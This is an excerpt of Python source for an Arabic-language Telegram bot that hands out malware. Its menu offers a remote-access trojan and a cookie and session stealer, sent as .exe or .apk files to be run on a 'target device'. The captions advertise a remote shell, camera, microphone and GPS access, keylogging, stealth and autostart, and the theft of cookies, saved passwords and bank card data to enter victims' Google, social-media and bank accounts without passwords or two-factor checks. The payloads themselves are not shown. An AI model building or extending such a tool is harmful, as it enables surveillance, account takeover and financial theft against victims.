...
# ===================== دوال الملفات (RAT, Session Stealer, Password Stealer) =====================
...
def build_main_menu(user_id):
    ...
    markup.row(
        ...
        InlineKeyboardButton("📡 ملف RAT للتحكم المباشر", callback_data="mode_rat_file")
    )
    markup.row(
        InlineKeyboardButton("🍪 ملف سرقة الجلسات والكوكيز", callback_data="mode_session_stealer")
    )
...
🔑 **قسم السرقة:**
• سرقة كلمات المرور - ملف APK (قيد التطوير)
• RAT للتحكم المباشر - ملف تحكم كامل (قيد التطوير)
• سرقة الجلسات والكوكيز - ملف سرقة الجلسات (قيد التطوير)
    ...
    if data == "mode_rat_file":
        ...
        if rat_path:
            with open(rat_path, 'rb') as f:
                bot.send_document(
                    chat_id,
                    ('RAT_Control.exe' if platform.system() == 'Windows' else 'RAT_Control.apk', f),
                    caption="📡 **ملف RAT للتحكم المباشر**\n\n"
                            ...
                            "• تتبع الموقع\n"
                            "• تسجيل لوحة المفاتيح\n\n"
                            "⚠️ سيتم بناء الملف بشكل كامل قريباً."
                )
        else:
            safe_send(
                chat_id,
                "📡 **ملف RAT للتحكم المباشر**\n\n"
                "📌 الملف قيد التطوير.\n"
                "⚠️ سيتم إتاحته قريباً.\n\n"
                "💡 **الوظائف المخطط لها:**\n"
                "• تحكم كامل بالجهاز المستهدف\n"
                "• تنفيذ أوامر عن بعد (Shell)\n"
                "• الوصول إلى نظام الملفات\n"
                "• تشغيل الكاميرا والميكروفون\n"
                "• تتبع الموقع عبر GPS\n"
                "• تسجيل ضغطات لوحة المفاتيح (Keylogger)\n"
                "• سرقة الملفات والبيانات\n"
                "• التخفي وعدم الظهور للمستخدم\n"
                "• تشغيل تلقائي عند بدء التشغيل\n"
                "• إرسال جميع البيانات عبر البوت"
            )
        return
    ...
    if data == "mode_session_stealer":
        ...
        if session_path:
            with open(session_path, 'rb') as f:
                bot.send_document(
                    chat_id,
                    ('SessionStealer.exe' if platform.system() == 'Windows' else 'SessionStealer.apk', f),
                    caption="🍪 **ملف سرقة الجلسات والكوكيز**\n\n"
                            "📌 قم بتنزيل الملف وتشغيله على الجهاز المستهدف.\n"
                            "⚡ **الوظائف:**\n"
                            "• سرقة جميع الكوكيز من المتصفحات\n"
                            "• سرقة جلسات التصفح النشطة\n"
                            "• سرقة كلمات المرور المخزنة\n"
                            "• سرقة بيانات البطاقات المصرفية\n"
                            "• سرقة تاريخ التصفح\n"
                            "• سرقة الإشارات المرجعية\n\n"
                            "🔑 **الدخول بدون كلمة مرور:**\n"
                            "باستخدام الكوكيز المسروقة، يمكن الدخول إلى حسابات الضحية\n"
                            "دون الحاجة إلى كلمة المرور أو التحقق بخطوتين.\n\n"
                            "⚠️ سيتم بناء الملف بشكل كامل قريباً."
                )
        else:
            safe_send(
                chat_id,
                "🍪 **ملف سرقة الجلسات والكوكيز**\n\n"
                "📌 الملف قيد التطوير.\n"
                "⚠️ سيتم إتاحته قريباً.\n\n"
                "💡 **الوظائف المخطط لها:**\n"
                "• سرقة جميع الكوكيز من المتصفحات:\n"
                ...
                "• إرسال البيانات عبر البوت\n\n"
                "🔑 **ميزة الدخول بدون كلمة مرور:**\n"
                "باستخدام الكوكيز المسروقة، يمكن للمطور الدخول إلى:\n"
                "• حسابات Google (Gmail, Drive, Photos)\n"
                "• حسابات Facebook, Instagram, Twitter\n"
                "• حسابات البنوك والخدمات المالية\n"
                "• أي موقع حفظت فيه معلومات الدخول\n"
                "• جميع الخدمات التي تستخدم حفظ الجلسة\n\n"
                "⚠️ **هذه الأداة خطيرة جداً، استخدمها بحذر!**"
            )
        return
